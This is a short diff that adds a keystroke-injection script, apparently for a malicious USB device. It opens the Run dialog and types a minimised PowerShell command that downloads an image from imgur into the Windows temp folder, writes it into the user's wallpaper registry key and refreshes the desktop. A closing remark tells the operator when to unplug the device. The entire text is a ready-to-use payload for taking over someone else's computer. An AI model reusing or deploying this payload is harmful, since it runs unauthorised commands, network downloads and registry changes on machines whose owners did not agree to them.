@@ -1,0 +1,4 @@
+Press: 131 + 114
+PrintLine: cmd /C "start /MIN powershell "iwr -Uri https://i.imgur.com/vY2N3ZK.jpg -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';1..10|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters}"
+Rem: End of payload* you can unplug the device when you see the led flash
+BlinkLED: 5
